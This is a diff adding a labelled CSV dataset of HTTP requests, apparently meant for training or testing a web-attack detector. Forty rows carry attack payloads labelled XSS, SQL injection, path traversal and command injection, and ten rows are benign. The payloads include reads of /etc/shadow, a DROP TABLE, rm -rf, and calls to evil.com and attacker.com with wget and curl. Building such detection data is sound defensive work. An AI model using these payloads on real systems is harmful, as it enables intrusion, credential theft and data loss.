@@ -1,0 +1,51 @@
+request_text,label,source
+"GET /search?q=<script>alert(1)</script> HTTP/1.1 Host:demo.com",xss,custom
+"GET /search?q=<img src=x onerror=alert(1)> HTTP/1.1 Host:demo.com",xss,custom
+"POST /login HTTP/1.1 Host:demo.com Body:user=admin&pass=<script>document.cookie</script>",xss,custom
+"GET /page?name=<svg onload=alert(1)> HTTP/1.1 Host:demo.com",xss,custom
+"GET /search?q=<iframe src=javascript:alert(1)> HTTP/1.1 Host:demo.com",xss,custom
+"GET /user?name=<body onload=alert(1)> HTTP/1.1 Host:demo.com",xss,custom
+"GET /page?q=<object data=javascript:alert(1)> HTTP/1.1 Host:demo.com",xss,custom
+"GET /item?x=<script src=http://evil.com/x.js></script> HTTP/1.1",xss,custom
+"POST /comment HTTP/1.1 Body:text=<img src=x onerror=document.cookie>",xss,custom
+"GET /search?q=javascript:eval(atob('YWxlcnQoMSk=')) HTTP/1.1",xss,custom
+"GET /item?id=1' OR '1'='1 HTTP/1.1 Host:demo.com",sqli,custom
+"GET /product?id=1 UNION SELECT username,password FROM users-- HTTP/1.1",sqli,custom
+"POST /login HTTP/1.1 Body:user=admin'-- &pass=anything",sqli,custom
+"GET /user?id=1; DROP TABLE users-- HTTP/1.1 Host:demo.com",sqli,custom
+"GET /item?id=1' AND 1=1-- HTTP/1.1 Host:demo.com",sqli,custom
+"GET /item?id=1 UNION SELECT null,null,null-- HTTP/1.1",sqli,custom
+"GET /search?q=1 AND SLEEP(5)-- HTTP/1.1 Host:demo.com",sqli,custom
+"GET /page?id=1;INSERT INTO admin VALUES('hacker','pass')-- HTTP/1.1",sqli,custom
+"GET /user?id=1 AND BENCHMARK(10000000,MD5(1))-- HTTP/1.1",sqli,custom
+"GET /item?id=1;WAITFOR DELAY '0:0:5'-- HTTP/1.1 Host:demo.com",sqli,custom
+"GET /files?name=../../etc/passwd HTTP/1.1 Host:demo.com",traversal,custom
+"GET /download?file=../../../windows/system32/config/sam HTTP/1.1",traversal,custom
+"GET /read?path=../../../../etc/shadow HTTP/1.1 Host:demo.com",traversal,custom
+"GET /img?src=../../secret.txt HTTP/1.1 Host:demo.com",traversal,custom
+"GET /load?file=%2e%2e%2f%2e%2e%2fetc%2fpasswd HTTP/1.1",traversal,custom
+"GET /get?f=....//....//etc/passwd HTTP/1.1 Host:demo.com",traversal,custom
+"GET /file?path=..%2F..%2Fetc%2Fshadow HTTP/1.1",traversal,custom
+"GET /read?file=/proc/self/environ HTTP/1.1 Host:demo.com",traversal,custom
+"GET /load?path=%252e%252e%252fetc%252fpasswd HTTP/1.1",traversal,custom
+"GET /get?file=/../../../boot.ini HTTP/1.1 Host:demo.com",traversal,custom
+"GET /cmd?exec=;cat /etc/passwd HTTP/1.1 Host:demo.com",cmdi,custom
+"POST /run HTTP/1.1 Body:cmd=ls -la | wget http://evil.com",cmdi,custom
+"GET /ping?host=127.0.0.1;id HTTP/1.1 Host:demo.com",cmdi,custom
+"GET /exec?command=`whoami` HTTP/1.1 Host:demo.com",cmdi,custom
+"POST /api HTTP/1.1 Body:action=;rm -rf /tmp/*",cmdi,custom
+"GET /tool?q=test;chmod 777 /etc/passwd HTTP/1.1",cmdi,custom
+"POST /submit HTTP/1.1 Body:data=$(cat /etc/passwd)",cmdi,custom
+"GET /util?cmd=test | curl http://attacker.com HTTP/1.1",cmdi,custom
+"GET /run?x=a && cat /etc/shadow HTTP/1.1",cmdi,custom
+"GET /exec?x=a;python -c 'import os;os.system(\"id\")' HTTP/1.1",cmdi,custom
+"GET /products HTTP/1.1 Host:demo.com User-Agent:Mozilla/5.0",benign,custom
+"GET /about HTTP/1.1 Host:demo.com User-Agent:Chrome/90",benign,custom
+"POST /login HTTP/1.1 Host:demo.com Body:username=john&password=pass123",benign,custom
+"GET /search?q=laptop HTTP/1.1 Host:demo.com User-Agent:Mozilla/5.0",benign,custom
+"GET /user/profile?id=42 HTTP/1.1 Host:demo.com",benign,custom
+"POST /contact HTTP/1.1 Host:demo.com Body:name=Alice&message=Hello",benign,custom
+"GET /api/products?category=electronics HTTP/1.1 Host:demo.com",benign,custom
+"GET /images/logo.png HTTP/1.1 Host:demo.com",benign,custom
+"POST /register HTTP/1.1 Host:demo.com Body:email=test@test.com&name=Bob",benign,custom
+"GET /blog/post-1 HTTP/1.1 Host:demo.com User-Agent:Firefox/88",benign,custom
